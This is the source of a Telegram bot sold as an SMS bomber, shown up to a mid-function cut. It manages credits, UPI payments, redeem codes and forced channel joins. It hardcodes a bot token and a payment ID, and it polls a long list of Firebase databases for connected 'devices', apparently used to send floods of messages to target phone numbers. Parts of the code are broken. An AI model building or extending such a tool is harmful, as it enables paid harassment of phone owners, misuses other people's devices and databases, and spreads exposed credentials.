#!/usr/bin/env python3
# 🔥 BULK SMS BOMBER BOT - OWNER UNLIMITED + FORCE JOIN
# Owner: @HACKAERXWHITE
# Owner ID: 6426979067

import re
import os
import sys
import requests
import json
import sqlite3
import random
import string
import time
import asyncio
import logging
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, KeyboardButton, ReplyKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters
from telegram.request import HTTPXRequest

# ============================
# ULTRA FAST CONFIGURATION
# ============================
request = HTTPXRequest(
    connect_timeout=10.0,
    read_timeout=10.0,
    write_timeout=10.0,
    pool_timeout=10.0,
)

# ============================
# CONFIGURATION
# ============================
TOKEN = "8467807885:AAEvjQc0oDU8UsBCdEjE3YNS0NVSW2Zj5Yg"
OWNER_ID = 6593129349
OWNER_USERNAME = 'Lucifer'

UPI_ID = "mysterymans989@okhdfcbank"
UPI_NAME = "HACKAERXWHITE"

BOT_ACTIVE = True
MAINTENANCE_MODE = False

# Redeem config
REDEEM_RATE_LIMIT = 3
REDEEM_MIN_ACCOUNT_AGE = 300
redeem_attempts = {}

# ============================
# FIREBASE URLs
# ============================
FIREBASE_URLS = [
    "https://fir-6b48f-default-rtdb.firebaseio.com",
    "https://colana-84ce2-default-rtdb.firebaseio.com",
    "https://raaz-5287d-default-rtdb.firebaseio.com",
    "https://new-sexy-default-rtdb.firebaseio.com",
    "https://amirrr-8a463-default-rtdb.firebaseio.com",
    "https://muajob-29c86-default-rtdb.firebaseio.com",
    "https://rahulgandhi-d09ca-default-rtdb.firebaseio.com",
    "https://hdjdjdj-a73f2-default-rtdb.firebaseio.com",
    "https://niggasionic-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://damo-98ebb-default-rtdb.firebaseio.com",
    "https://sep12-aea6d-default-rtdb.firebaseio.com",
    "https://hdfc-561e8-default-rtdb.firebaseio.com",
    "https://astra-b23a1-default-rtdb.firebaseio.com",
    "https://novap7-725ff-default-rtdb.firebaseio.com",
    "https://axisjames-default-rtdb.firebaseio.com",
    "https://yellow-panel-rto-default-rtdb.firebaseio.com",
    "https://bmw1-bdc10-default-rtdb.firebaseio.com",
    "https://me03-4e321-default-rtdb.firebaseio.com",
    "https://ream-13acd-default-rtdb.firebaseio.com",
    "https://makenewfriends-default-rtdb.firebaseio.com",
    "https://yt01-75a36-default-rtdb.firebaseio.com",
    "https://rahais-default-rtdb.firebaseio.com",
    "https://tinmm88-b7db5-default-rtdb.firebaseio.com",
    "https://e9turnament1-default-rtdb.firebaseio.com",
    "https://apkpure-6eb6a-default-rtdb.firebaseio.com",
    "https://e14turnament2-default-rtdb.firebaseio.com",
    "https://bossuun-default-rtdb.firebaseio.com",
    "https://jsjsjdj-7f0d1-default-rtdb.firebaseio.com",
    "https://rahul-54fe9-default-rtdb.firebaseio.com",
    "https://runjun-master-panel-default-rtdb.firebaseio.com",
    "https://gsjjshdbs-default-rtdb.firebaseio.com",
    "https://fir-1fa16-default-rtdb.firebaseio.com",
    "https://newspreding-default-rtdb.firebaseio.com",
    "https://privatesok-59944-default-rtdb.firebaseio.com",
    "https://risho-d4c66-default-rtdb.firebaseio.com",
    "https://fir-27c9e-default-rtdb.firebaseio.com",
    "https://singhaana-6f199-default-rtdb.firebaseio.com",
    "https://dogla-de225-default-rtdb.firebaseio.com",
    "https://vibe-d238e-default-rtdb.firebaseio.com",
    "https://painislv-default-rtdb.firebaseio.com",
    "https://jsjdj7374j-default-rtdb.firebaseio.com",
    "https://jaduopop-a9a12-default-rtdb.firebaseio.com",
    "https://anjali-4a4bc-default-rtdb.firebaseio.com",
    "https://devil-king-101d4-default-rtdb.firebaseio.com",
    "https://shuruwat-admin-default-rtdb.firebaseio.com",
    "https://rajputlodu-5bed0-default-rtdb.firebaseio.com",
    "https://kitter-34345-default-rtdb.firebaseio.com",
    "https://abcd-6757-ad421-default-rtdb.firebaseio.com",
    "https://kali-90e1e-default-rtdb.firebaseio.com",
    "https://asif-alam991-default-rtdb.firebaseio.com",
    "https://anvith-jaan-default-rtdb.firebaseio.com",
    "https://chutkabaal-d7051-default-rtdb.firebaseio.com",
    "https://clone-79a6f-default-rtdb.firebaseio.com",
    "https://hospital-14-default-rtdb.firebaseio.com",
    "https://gooodhua-default-rtdb.firebaseio.com",
    "https://yqhwy-2fb47-default-rtdb.firebaseio.com",
    "https://khushi-7fb1f-default-rtdb.firebaseio.com",
    "https://ppaanaal-default-rtdb.firebaseio.com",
    "https://priyanshrandi-18600-default-rtdb.firebaseio.com",
    "https://pehle-panel-default-rtdb.firebaseio.com",
    "https://yogeshbhai-default-rtdb.firebaseio.com",
    "https://myapp-8228a-default-rtdb.firebaseio.com",
    "https://app-2-7ac78-default-rtdb.firebaseio.com",
    "https://sorry-2d3c5-default-rtdb.firebaseio.com",
    "https://fvbtl-3f47c-default-rtdb.firebaseio.com",
    "https://anther-a3fe9-default-rtdb.firebaseio.com",
    "https://avraj-4d02e-default-rtdb.firebaseio.com",
    "https://spy-25-default-rtdb.firebaseio.com",
    "https://sirelech1-default-rtdb.firebaseio.com",
    "https://rahulcscperosnl-default-rtdb.firebaseio.com",
    "https://reliable-stroopwa-default-rtdb.firebaseio.com",
    "https://rancho-72506-default-rtdb.firebaseio.com",
    "https://pablo-5a0d2-default-rtdb.firebaseio.com",
    "https://reen-f8f5f-default-rtdb.firebaseio.com",
    "https://pehla-panel-green-default-rtdb.firebaseio.com",
    "https://lodaroll-default-rtdb.firebaseio.com",
    "https://jamini-c946b-default-rtdb.firebaseio.com",
    "https://strange-2e4aa-default-rtdb.firebaseio.com",
    "https://vdgsh-623ed-default-rtdb.firebaseio.com",
    "https://ritesh0001-ea582-default-rtdb.firebaseio.com",
    "https://tika3-a400c-default-rtdb.firebaseio.com",
    "https://admin-panel-b2935-default-rtdb.firebaseio.com",
    "https://aug1-ea7c9-default-rtdb.firebaseio.com",
]

# ============================
# FORCE JOIN CHANNELS
# ============================
REQUIRED_CHANNELS = [
    {"name": "OSINT MASTER", "username": "OSINTMASTER09", "link": ""},
    {"name": "BUILD WITH API", "username": "BUILDWITHAPI", "link": ""},
    {"name": "NUMBER TO INFO", "username": "numbertoinformation1", "link": ""}
]

RECHARGE_PLANS = {10: 20, 25: 50, 50: 100, 100: 200, 250: 500, 500: 900, 1000: 1500}
LAST_BOMBED = {"user": None, "number": None, "time": None, "count": 0}

# ============================
# DATABASE
# ============================
DB_PATH = "bot_data.db"

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY, credits INTEGER DEFAULT 5,
        referrer_id INTEGER, joined_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
    c.execute('''CREATE TABLE IF NOT EXISTS banned_users (
        user_id INTEGER PRIMARY KEY, banned_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP, banned_by INTEGER)''')
    c.execute('''CREATE TABLE IF NOT EXISTS payments (
        id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, amount INTEGER,
        credits_given INTEGER, transaction_id TEXT, screenshot_id TEXT,
        status TEXT DEFAULT 'pending', created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
    c.execute('''CREATE TABLE IF NOT EXISTS user_history (
        id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, action TEXT,
        details TEXT, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
    c.execute('''CREATE TABLE IF NOT EXISTS redeem_codes (
        id INTEGER PRIMARY KEY AUTOINCREMENT, code TEXT UNIQUE, credits INTEGER,
        max_uses INTEGER, used_count INTEGER DEFAULT 0, created_by INTEGER,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP, expires_at TIMESTAMP,
        is_active INTEGER DEFAULT 1)''')
    c.execute('''CREATE TABLE IF NOT EXISTS redeemed_by (
        id INTEGER PRIMARY KEY AUTOINCREMENT, code_id INTEGER, user_id INTEGER,
        redeemed_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP, UNIQUE(code_id, user_id))''')
    conn.commit()
    conn.close()
    print("✅ Database initialized!")

init_db()

# ============================
# DATABASE FUNCTIONS
# ============================
def is_owner(user_id):
    return user_id == OWNER_ID

def get_user_credits(user_id):
    # OWNER HAS UNLIMITED CREDITS
    if is_owner(user_id):
        return "∞"
    
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT credits FROM users WHERE user_id = ?", (user_id,))
    row = c.fetchone()
    conn.close()
    if row:
        return row[0]
    else:
        add_new_user(user_id)
        return 5

def get_user_joined_at(user_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT joined_at FROM users WHERE user_id = ?", (user_id,))
    row = c.fetchone()
    conn.close()
    return row[0] if row else None

def add_new_user(user_id, referrer_id=None):
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT user_id FROM users WHERE user_id = ?", (user_id,))
        if c.fetchone():
            conn.close()
            return
        c.execute("INSERT INTO users (user_id, credits, referrer_id) VALUES (?, ?, ?)",
                  (user_id, 5, referrer_id))
        conn.commit()
        conn.close()
        if referrer_id and referrer_id != user_id:
            conn2 = sqlite3.connect(DB_PATH)
            c2 = conn2.cursor()
            c2.execute("SELECT credits FROM users WHERE user_id = ?", (referrer_id,))
            if c2.fetchone():
                c2.execute("UPDATE users SET credits = credits + 1 WHERE user_id = ?", (referrer_id,))
                conn2.commit()
            conn2.close()
    except:
        pass

def deduct_credit(user_id):
    # OWNER NEVER LOSES CREDITS
    if is_owner(user_id):
        return True
    
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("UPDATE users SET credits = credits - 1 WHERE user_id = ? AND credits > 0", (user_id,))
    affected = c.rowcount
    conn.commit()
    conn.close()
    return affected > 0

def add_credits(user_id, amount):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("UPDATE users SET credits = credits + ? WHERE user_id = ?", (amount, user_id))
    conn.commit()
    conn.close()

def remove_credits(user_id, amount):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("UPDATE users SET credits = credits - ? WHERE user_id = ? AND credits >= ?", (amount, user_id, amount))
    affected = c.rowcount
    conn.commit()
    conn.close()
    return affected > 0

def set_credits(user_id, amount):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("UPDATE users SET credits = ? WHERE user_id = ?", (amount, user_id))
    conn.commit()
    conn.close()

def ban_user(user_id, admin_id):
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("INSERT OR IGNORE INTO banned_users (user_id, banned_by) VALUES (?, ?)", (user_id, admin_id))
        conn.commit()
        conn.close()
        return True
    except:
        return False

def unban_user(user_id):
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("DELETE FROM banned_users WHERE user_id = ?", (user_id,))
        affected = c.rowcount
        conn.commit()
        conn.close()
        return affected > 0
    except:
        return False

def is_user_banned(user_id):
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT user_id FROM banned_users WHERE user_id = ?", (user_id,))
        row = c.fetchone()
        conn.close()
        return row is not None
    except:
        return False

def create_payment(user_id, amount, credits_given, transaction_id=None, screenshot_id=None):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''INSERT INTO payments (user_id, amount, credits_given, transaction_id, screenshot_id, status)
        VALUES (?, ?, ?, ?, ?, 'pending')''', (user_id, amount, credits_given, transaction_id, screenshot_id))
    pid = c.lastrowid
    conn.commit()
    conn.close()
    return pid

def log_user_action(user_id, action, details=""):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT INTO user_history (user_id, action, details) VALUES (?, ?, ?)", (user_id, action, details))
    conn.commit()
    conn.close()

def get_user_history(user_id, limit=10):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT action, details, created_at FROM user_history WHERE user_id = ? ORDER BY id DESC LIMIT ?", (user_id, limit))
    rows = c.fetchall()
    conn.close()
    return rows

def get_referral_link(user_id, bot_username):
    return f"https://t.me/{bot_username}?start=ref_{user_id}"

def get_all_users():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT user_id, credits FROM users")
    rows = c.fetchall()
    conn.close()
    return rows

def get_total_users():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM users")
    count = c.fetchone()[0]
    conn.close()
    return count

def get_total_revenue():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT SUM(amount) FROM payments WHERE status = 'approved'")
    row = c.fetchone()
    conn.close()
    return row[0] if row[0] else 0

def get_total_credits_given():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT SUM(credits) FROM users")
    row = c.fetchone()
    conn.close()
    return row[0] if row[0] else 0

# ============================
# REDEEM FUNCTIONS
# ============================
def create_redeem_code(code, credits, max_uses, expiry_days, created_by):
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        expires_at = (datetime.now() + timedelta(days=expiry_days)).isoformat() if expiry_days > 0 else None
        c.execute('''INSERT INTO redeem_codes (code, credits, max_uses, created_by, expires_at)
            VALUES (?, ?, ?, ?, ?)''', (code.upper(), credits, max_uses, created_by, expires_at))
        conn.commit()
        conn.close()
        return True
    except:
        return False

def validate_redeem_code(code, user_id):
    if is_owner(user_id):
        return False, "❌ Owner cannot redeem codes!", 0
    
    if is_user_banned(user_id):
        return False, "❌ Banned users cannot redeem codes!", 0
    
    joined_at = get_user_joined_at(user_id)
    if joined_at:
        try:
            join_time = datetime.fromisoformat(joined_at)
            age = (datetime.now() - join_time).total_seconds()
            if age < REDEEM_MIN_ACCOUNT_AGE:
                remaining = int((REDEEM_MIN_ACCOUNT_AGE - age) / 60)
                return False, f"⏳ Account too new!\nWait {remaining} min more.", 0
        except:
            pass
    
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT * FROM redeem_codes WHERE code = ? AND is_active = 1", (code.upper(),))
    row = c.fetchone()
    
    if not row:
        conn.close()
        return False, "❌ Invalid redeem code!", 0
    
    code_id = row[0]
    credits = row[2]
    max_uses = row[3]
    used_count = row[4]
    expires_at = row[7]
    
    if expires_at:
        try:
            expiry = datetime.fromisoformat(expires_at)
            if datetime.now() > expiry:
                conn.close()
                return False, "❌ Code has expired!", 0
        except:
            pass
    
    if max_uses > 0 and used_count >= max_uses:
        conn.close()
        return False, "❌ Code usage limit reached!", 0
    
    c.execute("SELECT id FROM redeemed_by WHERE code_id = ? AND user_id = ?", (code_id, user_id))
    if c.fetchone():
        conn.close()
        return False, "❌ You already used this code!", 0
    
    c.execute("UPDATE redeem_codes SET used_count = used_count + 1 WHERE id = ?", (code_id,))
    c.execute("INSERT INTO redeemed_by (code_id, user_id) VALUES (?, ?)", (code_id, user_id))
    conn.commit()
    conn.close()
    
    add_credits(user_id, credits)
    return True, "✅ Redeem Successful!", credits

def get_redeem_code_info(code):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT * FROM redeem_codes WHERE code = ?", (code.upper(),))
    row = c.fetchone()
    conn.close()
    return row

def list_redeem_codes():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT code, credits, max_uses, used_count, created_at, expires_at, is_active FROM redeem_codes ORDER BY id DESC LIMIT 20")
    rows = c.fetchall()
    conn.close()
    return rows

def delete_redeem_code(code):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("DELETE FROM redeem_codes WHERE code = ?", (code.upper(),))
    affected = c.rowcount
    conn.commit()
    conn.close()
    return affected > 0

def get_code_users(code):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''SELECT rb.user_id, rb.redeemed_at FROM redeemed_by rb
        JOIN redeem_codes rc ON rb.code_id = rc.id WHERE rc.code = ?
        ORDER BY rb.redeemed_at DESC''', (code.upper(),))
    rows = c.fetchall()
    conn.close()
    return rows

def check_rate_limit(user_id):
    now = time.time()
    if user_id not in redeem_attempts:
        redeem_attempts[user_id] = []
    redeem_attempts[user_id] = [t for t in redeem_attempts[user_id] if now - t < 60]
    if len(redeem_attempts[user_id]) >= REDEEM_RATE_LIMIT:
        return False
    redeem_attempts[user_id].append(now)
    return True

# ============================
# FIREBASE FUNCTIONS
# ============================
def fetch_json_data(url, path, auth=None):
    try:
        full_url = f"{url.rstrip('/')}/{path}.json"
        if auth and auth.strip():
            full_url += f"?auth={auth}"
        response = requests.get(full_url, timeout=3)
        if response.status_code == 200:
            return response.json()
        return None
    except:
        return None

def firebase_put(url, key, path, data):
    try:
        full_url = f"{url.rstrip('/')}/{path}.json"
        if key and key.strip():
            full_url += f"?auth={key}"
        resp = requests.put(full_url, json=data, timeout=3)
        return resp.status_code in (200, 201)
    except:
        return False

def check_firebase_health(url):
    try:
        data = fetch_json_data(url, "/clients")
        if data and isinstance(data, dict):
            return True, len(data.keys())
        return False, 0
    except:
        return False, 0

def get_all_online_firebases():
    online = []
    for url in FIREBASE_URLS:
        ok, count = check_firebase_health(url)
        if ok and count > 0:
            online.append((url, count))
    return online

def get_firebase_status_text():
    online = get_all_online_firebases()
    if not online:
        return "❌ No online firebases!"
    text = "📡 **ONLINE FIREBASES**\n━━━━━━━━━━━━━━━━━━\n"
    for url, devices in online:
        short = url.replace("https://", "").replace(".firebaseio.com", "").replace(".firebasedatabase.app", "")
        text += f"✅ `{short[:25]}` — {devices} devices\n"
    text += f"\n━━━━━━━━━━━━━━━━━━\n📡 Total: `{len(online)}/{len(FIREBASE_URLS)}`"
    return text

def generate_otp(length=6):
    return ''.join(random.choices(string.digits, k=length))

def validate_phone_number(number):
    number = number.strip()
    if not number.startswith('+91'):
        return False, "❌ Must start with +91"
    remaining = number[3:]
    if not remaining.isdigit():
        return False, "❌ Only digits allowed"
    if len(remaining) != 10:
        return False, f"❌ Enter 10 digits (you entered {len(remaining)})"
    return True, "✅ Valid"

def create_progress_bar(current, total, width=20):
    if total <= 0:
        return "█" * width + " 0%"
    pct = min(current / total, 1.0)
    filled = int(pct * width)
    return f"{'█' * filled}{'░' * (width - filled)} {int(pct * 100)}%"

# ============================
# SIGMA QUOTES
# ============================
SIGMA_QUOTES = [
    "🔥 **Sigma Rule #1:** Never let them know your next move.",
    "💀 **Sigma Rule #2:** Silence is the best answer.",
    "⚡ **Sigma Rule #3:** Your energy is your currency.",
    "👑 **Sigma Rule #4:** Be the king, not the pawn.",
    "🎯 **Sigma Rule #5:** Focus on your goals, not distractions.",
    "🔱 **Sigma Rule #6:** Trust no one, verify everything.",
    "🦁 **Sigma Rule #7:** Walk alone if you must.",
    "🌊 **Sigma Rule #8:** Stay calm, even in chaos.",
    "💎 **Sigma Rule #9:** Your value doesn't decrease based on others.",
    "🚀 **Sigma Rule #10:** The grind never stops.",
]

# ============================
# DANCING VIDEOS
# ============================
DANCING_VIDEOS = [
    "https://i.imgur.com/video1.mp4",
    "https://i.imgur.com/video2.mp4",
    "https://i.imgur.com/video3.mp4",
]

# ============================
# FORCE JOIN FUNCTIONS
# ============================
_membership_cache = {}
_cache_time = {}

def is_user_member_of_all_channels(user_id, bot_instance):
    if is_owner(user_id):
        return True
    
    if user_id in _cache_time and time.time() - _cache_time[user_id] < 5:
        return _membership_cache.get(user_id, False)
    
    for channel in REQUIRED_CHANNELS:
        try:
            chat = bot_instance.get_chat(f"@{channel['username']}")
            member = bot_instance.get_chat_member(chat.id, user_id)
            if member.status not in ['member', 'administrator', 'creator']:
                _membership_cache[user_id] = False
                _cache_time[user_id] = time.time()
                return False
        except:
            _membership_cache[user_id] = False
            _cache_time[user_id] = time.time()
            return False
    
    _membership_cache[user_id] = True
    _cache_time[user_id] = time.time()
    return True

def get_join_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    for channel in REQUIRED_CHANNELS:
        keyboard.add(InlineKeyboardButton(f"📢 Join {channel['name']}", url=channel['link']))
    keyboard.add(InlineKeyboardButton("✅ I've Joined All Channels", callback_data="verify_channels"))
    return keyboard

# ============================
# MAIN KEYBOARD
# ============================
def get_main_keyboard(user_id):
    keyboard = [
        [KeyboardButton(text="💣 BOMB SMS")],
        [KeyboardButton(text="💰 Credits"), KeyboardButton(text="🎫 REDEEM CODE")],
        [KeyboardButton(text="🔗 Referral"), KeyboardButton(text="💳 Recharge")],
        [KeyboardButton(text="📡 Firebase"), KeyboardButton(text="📜 History")],
        [KeyboardButton(text="🛡️ Status"), KeyboardButton(text="👨‍💻 Developer")],
    ]
    if is_owner(user_id):
        keyboard.append([KeyboardButton(text="👑 OWNER PANEL")])
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

# ============================
# OWNER PANEL KEYBOARD
# ============================
def get_owner_panel_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📊 STATISTICS", callback_data="owner_stats")],
        [InlineKeyboardButton("➕ ADD CREDITS", callback_data="owner_addcredits")],
        [InlineKeyboardButton("➖ REMOVE CREDITS", callback_data="owner_removecredits")],
        [InlineKeyboardButton("🎯 SET CREDITS", callback_data="owner_setcredits")],
        [InlineKeyboardButton("🚫 BAN USER", callback_data="owner_ban")],
        [InlineKeyboardButton("✅ UNBAN USER", callback_data="owner_unban")],
        [InlineKeyboardButton("📨 BROADCAST", callback_data="owner_broadcast")],
        [InlineKeyboardButton("📊 VIEW USERS", callback_data="owner_users")],
        [InlineKeyboardButton("📡 ADD FIREBASE", callback_data="owner_addfirebase")],
        [InlineKeyboardButton("🗑️ REMOVE FIREBASE", callback_data="owner_removefirebase")],
        [InlineKeyboardButton("💳 UPI SETTINGS", callback_data="owner_upi")],
        [InlineKeyboardButton("💰 PRICE SETTINGS", callback_data="owner_price")],
        [InlineKeyboardButton("🔄 CHECK FIREBASES", callback_data="owner_checkfb")],
        [InlineKeyboardButton("🎫 CREATE REDEEM", callback_data="owner_create_redeem")],
        [InlineKeyboardButton("📋 REDEEM LIST", callback_data="owner_redeem_list")],
        [InlineKeyboardButton("🔴 SHUTDOWN", callback_data="owner_shutdown")],
        [InlineKeyboardButton("🟢 START BOT", callback_data="owner_start")],
        [InlineKeyboardButton("📤 EXPORT DATA", callback_data="owner_export")],
        [InlineKeyboardButton("🔙 BACK", callback_data="owner_back")]
    ])

# ============================
# START HANDLER
# ============================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not BOT_ACTIVE and not is_owner(user_id):
        await update.message.reply_text("🔴 **Bot is currently OFF.**\nOnly owner can use.")
        return
    
    if is_user_banned(user_id):
        await update.message.reply_text("❌ You are banned.")
        return
    
    # FORCE JOIN CHECK
    if not is_user_member_of_all_channels(user_id, context.application.bot):
        await send_join_required_message(update.message.chat.id, user_id, context.application.bot)
        return
    
    referrer_id = None
    if context.args and len(context.args) > 0 and context.args[0].startswith("ref_"):
        try:
            referrer_id = int(context.args[0].split("_")[1])
        except:
            pass
    
    add_new_user(user_id, referrer_id)
    credits = get_user_credits(user_id)
    online = len(get_all_online_firebases())
    
    sigma_quote = random.choice(SIGMA_QUOTES)
    
    if is_owner(user_id):
        credits_text = "∞ UNLIMITED"
    else:
        credits_text = str(credits)
    
    welcome = f"⚡ **{OWNER_USERNAME} SMS BOMBER** ⚡\n"
    welcome += "━─━────༺༻────━─━\n"
    welcome += f"{sigma_quote}\n"
    welcome += "━─━────༺༻────━─━\n"
    welcome += f"💰 Credits: `{credits_text}`\n"
    welcome += f"📡 Firebases: `{online}/{len(FIREBASE_URLS)}`\n"
    welcome += "━─━────༺༻────━─━\n"
    welcome += "Use buttons below."
    
    await update.message.reply_text(welcome, parse_mode="HTML", reply_markup=get_main_keyboard(user_id))
    
    try:
        video_url = random.choice(DANCING_VIDEOS)
        await update.message.reply_video(video_url, caption="🔥 **DANCE LIKE NO ONE'S WATCHING** 🔥", parse_mode="HTML")
    except:
        pass

async def send_join_required_message(chat_id, user_id, bot_instance):
    text = "🔒 **CHANNEL VERIFICATION REQUIRED**\n"
    text += "━━━━━━━━━━━━━━━━━━\n\n"
    text += "⚠️ You must join **ALL** channels to use this bot:\n\n"
    for channel in REQUIRED_CHANNELS:
        text += f"• {channel['name']}\n"
    text += "\n👇 Click the buttons below to join, then tap **I've Joined All Channels**."
    
    await bot_instance.send_message(chat_id, text, parse_mode="HTML", reply_markup=get_join_keyboard())

async def verify_channels_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    
    if is_user_member_of_all_channels(user_id, context.application.bot):
        await query.edit_message_text("✅ **Verified!**\nUse /start to continue.")
        await start(update, context)
    else:
        missing = []
        for channel in REQUIRED_CHANNELS:
            try:
                chat = await context.application.bot.get_chat(f"@{channel['username']}")
                member = await context.application.bot.get_chat_member(chat.id, user_id)
                if member.status not in ['member', 'administrator', 'creator']:
                    missing.append(channel['name'])
            except:
                missing.append(channel['name'])
        
        text = "❌ **You haven't joined all channels!**\n\n"
        if missing:
            text += "**Missing:**\n"
            for name in missing:
                text += f"• {name}\n"
        text += "\nPlease join them and try again."
        await query.edit_message_text(text, parse_mode="HTML", reply_markup=get_join_keyboard())

# ============================
# OWNER PANEL
# ============================
async def owner_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("⛔ Unauthorized.")
        return
    
    status = "🟢 ONLINE" if BOT_ACTIVE else "🔴 OFFLINE"
    text = f"👑 **OWNER PANEL**\n━━━━━━━━━━━━━━━━━━\n"
    text += f"Bot Status: {status}\n"
    text += f"Total Users: {get_total_users()}\n"
    text += f"Firebases: {len(FIREBASE_URLS)}\n"
    text += f"💎 Your Credits: ∞ UNLIMITED\n"
    text += "━━━━━━━━━━━━━━━━━━\n"
    text += "Select an option:"
    
    await update.message.reply_text(text, parse_mode="HTML", reply_markup=get_owner_panel_keyboard())

# ============================
# OWNER CALLBACKS
# ============================
async def owner_callbacks(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    data = query.data
    
    if not is_owner(user_id):
        await query.edit_message_text("⛔ Unauthorized.")
        return
    
    if data == "owner_stats":
        online = len(get_all_online_firebases())
        text = f"📊 **STATISTICS**\n━━━━━━━━━━━━━━━━━━\n"
        text += f"👥 Users: `{get_total_users()}`\n"
        text += f"💰 Revenue: `₹{get_total_revenue()}`\n"
        text += f"💎 Credits: `{get_total_credits_given()}`\n"
        text += f"📡 Online: `{online}/{len(FIREBASE_URLS)}`\n"
        if LAST_BOMBED['number']:
            text += f"\n🎯 Last Bombed:\n"
            text += f"   User: `{LAST_BOMBED['user']}`\n"
            text += f"   Number: `{LAST_BOMBED['number']}`\n"
            text += f"   Time: `{LAST_BOMBED['time']}`\n"
            text += f"   Count: `{LAST_BOMBED['count']}`"
        await query.edit_message_text(text, parse_mode="HTML")
        return
    
    elif data == "owner_addcredits":
        await query.edit_message_text("➕ **Add Credits**\n\nSend: `/addcredits <user_id> <amount>`")
    elif data == "owner_removecredits":
        await query.edit_message_text("➖ **Remove Credits**\n\nSend: `/removecredits <user_id> <amount>`")
    elif data == "owner_setcredits":
        await query.edit_message_text("🎯 **Set Credits**\n\nSend: `/setcredits <user_id> <amount>`")
    elif data == "owner_ban":
        await query.edit_message_text("🚫 **Ban User**\n\nSend: `/ban <user_id>`")
    elif data == "owner_unban":
        await query.edit_message_text("✅ **Unban User**\n\nSend: `/unban <user_id>`")
    elif data == "owner_broadcast":
        await query.edit_message_text("📨 **Broadcast**\n\nSend: `/broadcast <message>`")
    elif data == "owner_users":
        users = get_all_users()
        text = "📊 **USERS**\n━━━━━━━━━━━━━━━━━━\n"
        for uid, credits in users[:20]:
            text += f"• `{uid}` - 💰{credits}\n"
        if len(users) > 20:
            text += f"\n... and {len(users)-20} more"
        await query.edit_message_text(text, parse_mode="HTML")
    elif data == "owner_addfirebase":
        await query.edit_message_text("📡 **Add Firebase**\n\nSend: `/addfirebase <url>`")
    elif data == "owner_removefirebase":
        await query.edit_message_text("🗑️ **Remove Firebase**\n\nSend: `/removefirebase <url>`")
    elif data == "owner_checkfb":
        text = get_firebase_status_text()
        await query.edit_message_text(text, parse_mode="HTML")
    elif data == "owner_upi":
        await query.edit_message_text(f"💳 **UPI:** `{UPI_ID}`\n\nSend: `/setupi <new_upi>`")
    elif data == "owner_price":
        text = "💰 **PRICES**\n━━━━━━━━━━━━━━━━━━\n"
        for credits, price in RECHARGE_PLANS.items():
            text += f"• {credits} → ₹{price}\n"
        text += f"\nSend: `/setprice <credits> <price>`"
        await query.edit_message_text(text, parse_mode="HTML")
    elif data == "owner_create_redeem":
        await query.edit_message_text(
            "🎫 **CREATE REDEEM CODE**\n"
            "━━━━━━━━━━━━━━━━━━\n\n"
            "**Format:**\n"
            "`/redeem <name> <credits> <max_uses> <expiry_days>`\n\n"
            "**Examples:**\n"
            "`/redeem BONUS 100 50 7`\n"
            "→ 100 credits, 50 users, 7 days\n\n"
            "`/redeem FREE 50 10 0`\n"
            "→ 50 credits, 10 users, never expires"
        )
    elif data == "owner_redeem_list":
        rows = list_redeem_codes()
        if not rows:
            await query.edit_message_text("📋 No redeem codes found.")
            return
        text = "📋 **REDEEM CODES**\n━━━━━━━━━━━━━━━━━━\n"
        for code, credits, max_uses, used, created, expires, active in rows:
            used_str = f"{used}/{max_uses}" if max_uses > 0 else f"{used}/∞"
            status = "✅" if active else "❌"
